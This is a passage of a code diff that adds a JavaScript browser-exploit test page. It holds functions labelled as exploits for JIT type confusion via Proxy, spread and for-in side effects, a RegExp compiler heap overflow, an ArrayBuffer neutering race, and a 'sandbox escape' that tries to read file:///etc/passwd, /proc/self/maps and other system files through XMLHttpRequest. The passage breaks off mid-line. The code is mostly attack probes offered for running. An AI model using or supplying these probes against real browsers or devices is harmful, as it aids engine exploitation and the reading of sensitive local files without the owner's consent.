+                log('log5', 'Creating malicious Proxy...');
+                
+                let confused = false;
+                const handler = {
+                    get(target, prop) {
+                        if (confused) {
+                            log('log5', `Confused access to: ${prop}`);
+                            return undefined;
+                        }
+                        return target[prop];
+                    },
+                    set(target, prop, value) {
+                        confused = true;
+                        return true;
+                    }
+                };
+                
+                const proxy = new Proxy({x: 1, y: 2}, handler);
+                
+                log('log5', 'Training JIT with Proxy access...');
+                
+                function access_proxy(obj) {
+                    return obj.x + obj.y;
+                }
+                
+                for (let i = 0; i < 100000; i++) {
+                    access_proxy(proxy);
+                }
+                
+                log('log5', 'Triggering confusion...');
+                proxy.z = 3;
+                
+                const result = access_proxy(proxy);
+                log('log5', `Result: ${result}`);
+                
+                log('log5', 'Testing recursive Proxy...');
+                const recursive = new Proxy({}, {
+                    get(target, prop) {
+                        return recursive;
+                    }
+                });
+                
+                try {
+                    const chain = recursive.a.b.c.d.e.f.g.h.i.j;
+                    log('log5', `Recursive chain: ${typeof chain}`);
+                } catch (e) {
+                    log('log5', `Recursive error: ${e.message}`, true);
+                }
+                
+                log('log5', 'Test completed');
+                
+            } catch (e) {
+                log('log5', `EXCEPTION: ${e.message}`, true);
+            }
+        }
+
+        // RegExp Compiler Bug
+        function testRegExpCompiler() {
+            log('log6', 'RegExp compiler heap overflow exploit');
+            
+            try {
+                log('log6', 'Creating complex regex patterns...');
+                
+                // Pattern 1: Deeply nested groups
+                const nested = '('.repeat(500) + 'a' + ')'.repeat(500);
+                try {
+                    const re1 = new RegExp(nested);
+                    re1.test('a');
+                    log('log6', 'Nested groups compiled successfully');
+                } catch (e) {
+                    log('log6', `Nested groups failed: ${e.message}`, true);
+                }
+                
+                // Pattern 2: Large character class
+                log('log6', 'Testing large character class...');
+                let charClass = '[';
+                for (let i = 0; i < 10000; i++) {
+                    charClass += 'a-z';
+                }
+                charClass += ']';
+                
+                try {
+                    const re2 = new RegExp(charClass);
+                    re2.test('z');
+                    log('log6', 'Large character class compiled');
+                } catch (e) {
+                    log('log6', `Character class failed: ${e.message}`, true);
+                }
+                
+                // Pattern 3: Backreference overflow
+                log('log6', 'Testing backreference overflow...');
+                let backref = '';
+                for (let i = 1; i <= 1000; i++) {
+                    backref += `(a)\\${i}`;
+                }
+                
+                try {
+                    const re3 = new RegExp(backref);
+                    log('log6', 'Backreference pattern compiled');
+                } catch (e) {
+                    log('log6', `Backreference failed: ${e.message}`, true);
+                }
+                
+                log('log6', 'Test completed');
+                
+            } catch (e) {
+                log('log6', `EXCEPTION: ${e.message}`, true);
+            }
+        }
+
+        // ArrayBuffer Neutering Race
+        function testArrayBufferRace() {
+            log('log7', 'ArrayBuffer neutering race condition exploit');
+            
+            try {
+                log('log7', 'Creating ArrayBuffer...');
+                
+                const buffer = new ArrayBuffer(1024);
+                const view = new Uint32Array(buffer);
+                
+                for (let i = 0; i < view.length; i++) {
+                    view[i] = i;
+                }
+                
+                log('log7', 'Setting up race condition...');
+                
+                let raceWon = false;
+                
+                // Attempt to use buffer while it's being transferred
+                const intervalId = setInterval(() => {
+                    try {
+                        view[0] = 0xdeadbeef;
+                        const val = view[0];
+                        if (raceWon) {
+                            log('log7', `Accessed neutered buffer: 0x${val.toString(16)}`);
+                        }
+                    } catch (e) {
+                        log('log7', `Race condition caught: ${e.message}`, true);
+                        clearInterval(intervalId);
+                    }
+                }, 1);
+                
+                setTimeout(() => {
+                    log('log7', 'Attempting to neuter buffer...');
+                    try {
+                        // Try to transfer/neuter the buffer
+                        const worker = new Worker('data:application/javascript,');
+                        worker.postMessage(buffer, [buffer]);
+                        raceWon = true;
+                        log('log7', 'Buffer transfer attempted');
+                    } catch (e) {
+                        log('log7', `Transfer failed: ${e.message}`, true);
+                    }
+                    
+                    setTimeout(() => {
+                        clearInterval(intervalId);
+                        log('log7', 'Test completed');
+                    }, 100);
+                }, 50);
+                
+            } catch (e) {
+                log('log7', `EXCEPTION: ${e.message}`, true);
+            }
+        }
+
+        // Spread Operator Type Confusion
+        function testSpreadConfusion() {
+            log('log8', 'Spread operator type confusion exploit');
+            
+            try {
+                log('log8', 'Training JIT with spread operator...');
+                
+                function spread_test(...args) {
+                    return [...args, 99];
+                }
+                
+                for (let i = 0; i < 100000; i++) {
+                    spread_test(1, 2, 3, 4, 5);
+                }
+                
+                log('log8', 'JIT optimized for spread');
+                log('log8', 'Attempting confusion with iterator...');
+                
+                const confused = {
+                    [Symbol.iterator]: function*() {
+                        yield 1;
+                        yield 2;
+                        // Change internal state during iteration
+                        this.mutated = true;
+                        yield 3;
+                    }
+                };
+                
+                try {
+                    const result = [...confused];
+                    log('log8', `Spread result: [${result}]`);
+                } catch (e) {
+                    log('log8', `Spread confusion caught: ${e.message}`, true);
+                }
+                
+                log('log8', 'Testing with infinite iterator...');
+                const infinite = {
+                    [Symbol.iterator]: function*() {
+                        let i = 0;
+                        while (i < 10000) {
+                            yield i++;
+                        }
+                    }
+                };
+                
+                try {
+                    const result = [...infinite];
+                    log('log8', `Infinite spread: ${result.length} elements`);
+                } catch (e) {
+                    log('log8', `Infinite spread caught: ${e.message}`, true);
+                }
+                
+                log('log8', 'Test completed');
+                
+            } catch (e) {
+                log('log8', `EXCEPTION: ${e.message}`, true);
+            }
+        }
+
+        // for-in Loop Side Effect
+        function testForInSideEffect() {
+            log('log9', 'for-in loop side effect modeling bug');
+            
+            try {
+                log('log9', 'Training JIT with for-in loop...');
+                
+                function forin_test(obj) {
+                    let result = [];
+                    for (let key in obj) {
+                        result.push(obj[key]);
+                    }
+                    return result;
+                }
+                
+                const normal = {a: 1, b: 2, c: 3};
+                for (let i = 0; i < 100000; i++) {
+                    forin_test(normal);
+                }
+                
+                log('log9', 'JIT optimized for-in');
+                log('log9', 'Triggering side effect during iteration...');
+                
+                const sideEffect = {
+                    a: 1,
+                    get b() {
+                        this.c = 999;
+                        delete this.d;
+                        this.e = 5;
+                        return 2;
+                    },
+                    d: 4
+                };
+                
+                const result = forin_test(sideEffect);
+                log('log9', `Result: [${result}]`);
+                log('log9', `Final object: ${JSON.stringify(sideEffect)}`);
+                
+                log('log9', 'Testing prototype modification during iteration...');
+                const proto = {x: 1, y: 2};
+                const child = Object.create(proto);
+                child.z = 3;
+                
+                let count = 0;
+                for (let key in child) {
+                    if (count === 1) {
+                        proto.newProp = 999;
+                    }
+                    log('log9', `Key: ${key} = ${child[key]}`);
+                    count++;
+                }
+                
+                log('log9', 'Test completed');
+                
+            } catch (e) {
+                log('log9', `EXCEPTION: ${e.message}`, true);
+            }
+        }
+
+        // Sandbox Escape: File URI Access
+        function testFileAccess() {
+            log('log10', 'Sandbox escape: File URI access attempt');
+            
+            try {
+                log('log10', 'Attempting file:// URI access...');
+                
+                const fileURIs = [
+                    'file:///etc/passwd',
+                    'file:///c:/windows/system.ini',
+                    'file:///system/build.prop',
+                    'file:///proc/self/maps',
+                    'file://localhost/etc/hosts',
+                ];
+                
+                fileURIs.forEach(uri => {
+                    try {
+                        log('log10', `Testing: ${uri}`);
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', uri, false);
+                        xhr.send();
+                        log('log10', `✓ ACCESS GRANTED: ${uri}`, true);
+                        log('log10', `Response: ${xhr.responseText.substring(0, 100)}`, true);
+                    } catch (e) {
+                        log('log10', `✗ Blocked: ${uri} - ${e.message}`);
+                    }
+                });
+                
+                log('log10', 'Testing iframe file access
